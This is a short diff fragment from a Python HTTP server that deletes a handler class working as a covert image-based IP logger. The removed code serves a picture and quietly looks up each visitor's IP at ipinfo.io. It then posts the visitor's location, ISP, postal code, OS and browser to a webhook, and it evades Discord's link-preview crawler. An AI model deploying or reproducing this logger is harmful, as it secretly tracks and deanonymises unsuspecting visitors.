@@ -102,18 +102,3 @@ class handler(BaseHTTPRequestHandler):
             self.send_header('Content-type','text/html')
             self.end_headers()
             self.wfile.write(b'<html><body><h1>404</h1></body></html>')
-
-
-class handler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        s = self.path
-        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-        try: data = requests.get(dic['url']).content if 'url' in dic else bindata
-        except Exception: data = bindata
-        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
-        os, browser = httpagentparser.simple_detect(useragent)
-        if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
-            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); requests.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
-            else: pass
-        else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = requests.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); requests.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
-        return
